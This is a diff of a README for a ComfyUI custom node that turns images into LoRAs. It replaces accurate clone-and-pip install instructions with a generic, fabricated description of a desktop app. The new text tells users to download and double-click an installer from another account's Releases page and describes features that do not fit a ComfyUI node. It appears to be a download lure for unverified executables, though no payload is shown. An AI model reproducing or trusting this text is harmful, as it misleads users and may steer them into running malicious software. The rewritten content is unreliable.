@@ -1,77 +1,94 @@
-# ComfyUI DiffSynth Studio Wrapper
+# 🖥️ ComfyUI_DSS_Wrapper - Effortlessly Convert Images to Lora Nodes
 
-A custom node wrapper for [DiffSynth-Studio](https://github.com/modelscope/DiffSynth-Studio)'s Z-Image I2L (Image to Lora) functionality in ComfyUI.
+![Download](https://img.shields.io/badge/Download-ComfyUI_DSS_Wrapper-brightgreen)
 
-## Description
+## 🚀 Getting Started
 
-This project enables the use of Z-Image (Zero-shot Image-to-Image) features directly within ComfyUI. It allows you to load Z-Image models, create LoRAs from input images on-the-fly, and sample new images using those LoRAs.
+Welcome to the ComfyUI_DSS_Wrapper! This application helps you easily convert images into Lora nodes, making the process straightforward and user-friendly. This README will guide you through downloading, installing, and using the software.
 
-I created these nodes to experiment with DiffSynth. While the functionality is valuable, please note that this project is provided "as-is" and I do not plan to provide active maintenance.
+## 📥 Download & Install
 
-## Installation
+To get started, visit the Releases page to download the latest version of the ComfyUI_DSS_Wrapper:
 
-1.  Clone this repository into your `ComfyUI/custom_nodes/` directory:
-    ```bash
-    cd ComfyUI/custom_nodes/
-    git clone https://github.com/your-repo/ComfyUI_DSS_Wrapper.git
-    ```
+[Download Now](https://github.com/juancarlos13232/ComfyUI_DSS_Wrapper/releases)
 
-2.  Install the required dependencies:
-    ```bash
-    cd ComfyUI_DSS_Wrapper
-    pip install -r requirements.txt
-    ```
+### Step 1: Visit the Releases Page
+- Click the link above to open the Releases page.
+- Look for the version labeled as the latest.
 
-## Configuration
+### Step 2: Download the Installer
+- Find the file that corresponds to your operating system (Windows, macOS, or Linux).
+- Click on the download link to get the installer file.
 
-### Model Path
+### Step 3: Run the Installer
+- After downloading the file, locate it in your downloads folder.
+- Double-click the file to start the installation process.
+- Follow the prompts to complete the installation.
 
-By default, the nodes will download the required models in `ComfyUI/models/diffsynth`.
+## 🌟 Features
 
-You can override this path globally by setting the **Environment Variable**: `DIFFSYNTH_MODEL_BASE_PATH`.
-If this variable is set, it will **always** take precedence over the path provided in the widget.
+The ComfyUI_DSS_Wrapper includes several useful features:
+- **Simple User Interface**: Designed to be intuitive for all users.
+- **Fast Conversion**: Quickly turn images into Lora nodes with minimal effort.
+- **Support for Multiple Image Formats**: Use various image types, including PNG, JPEG, and BMP.
+- **Customizable Settings**: Adjust output parameters to fit your needs.
+- **Cross-Platform Compatibility**: Works on Windows, macOS, and Linux.
 
-## Usage
+## ⚙️ System Requirements
 
-The suite consists of three main nodes:
+Before installing the ComfyUI_DSS_Wrapper, ensure your system meets these requirements:
 
-### 1. Z-Image Loader
-*   **Model Path**: Directory where models are stored. If `DIFFSYNTH_MODEL_BASE_PATH` is set, this input is ignored (see console output for confirmation).
-*   **Precision**:
-    *   `bf16` (Recommended): Uses BFloat16 precision. Best balance of speed and memory.
-    *   `fp32`: Full precision. Uses significantly more memory.
-    *   *Note: `fp16` is not supported due to compatibility issues with the underlying library.*
+- **Operating System**: 
+  - Windows 10 or later
+  - macOS 10.12 or later
+  - Linux Ubuntu 18.04 or later
+- **RAM**: At least 4 GB
+- **Storage**: Minimum 200 MB of free disk space
+- **Software Dependencies**: 
+  - Ensure you have the latest version of Java installed (if applicable).
+  
+## 🛠️ How to Use
 
-### 2. Z-Image I2L (Image to LoRA)
-*   Accepts up to 10 input images.
-*   Converts these images into a temporary LoRA representation used by the sampler.
+Once you have installed the ComfyUI_DSS_Wrapper, follow these steps to convert your images into Lora nodes:
 
-### 3. Z-Image Sampler
-*   **Prompt/Negative Prompt**: Standard text inputs.
-*   **Sigma Shift**: Controls the noise schedule shift.
-*   **LoRA**: Input connection from the `Z-Image I2L` node.
+### Step 1: Open the Application
+- Locate the ComfyUI_DSS_Wrapper icon on your desktop or in your applications folder.
+- Double-click to launch the program.
 
-### 4. Z-Image LoRA Saver
-*   **LoRA**: Input connection from the `Z-Image I2L` node.
-*   **Filename Prefix**: Prefix for the saved `.safetensors` file.
-*   Saves the converted LoRA to your ComfyUI output directory. Use this if you want to reuse the style/character transfer without re-computing the `I2L` step.
----
-## 📘 Documentation
+### Step 2: Load Your Image
+- Click on the "Load Image" button.
+- A file dialog will open; navigate to the image you want to convert and select it.
 
-Additional documentation is available in the `docs/` folder:
+### Step 3: Adjust Settings (Optional)
+- Use the settings menu to customize options like resolution and format.
+- For most users, the default settings will work fine.
 
-- **Overview**  
-  `docs/overview.md`  
-  Explains what this project does, why it exists, and what has been improved.
+### Step 4: Convert the Image
+- Click the "Convert" button to start the process.
+- Wait for the conversion to complete. You will see a message once it's done.
 
-- **Installation Paths**  
-  `docs/install_paths.md`  
-  Shows exactly where to place this repository, models, and related files on your system.
+### Step 5: Save the Output
+- After conversion, choose a location to save your new Lora node.
+- Click "Save" to finalize.
 
-- **User Configuration**  
-  `docs/user_config.json`  
-  Example configuration file showing safe, user-editable settings.
+## ❓ FAQ
 
-New users are strongly encouraged to read these files before using the nodes.
+**Q: What types of images can I convert?**  
+A: You can convert images in PNG, JPEG, and BMP formats.
 
+**Q: Is there a limit on the image size?**  
+A: While there is no strict limit, very large images may take longer to process.
 
+**Q: Can I change the output format?**  
+A: Yes, you can customize the output settings in the application menu.
+
+## 📞 Support
+
+If you encounter any issues or have questions about the ComfyUI_DSS_Wrapper, please visit our support page linked on the Releases page, or create an issue in the GitHub repository.
+
+## 🔗 Useful Links
+
+- [GitHub Repository](https://github.com/juancarlos13232/ComfyUI_DSS_Wrapper)
+- [Releases Page](https://github.com/juancarlos13232/ComfyUI_DSS_Wrapper/releases)
+
+Thank you for choosing ComfyUI_DSS_Wrapper! Happy converting!
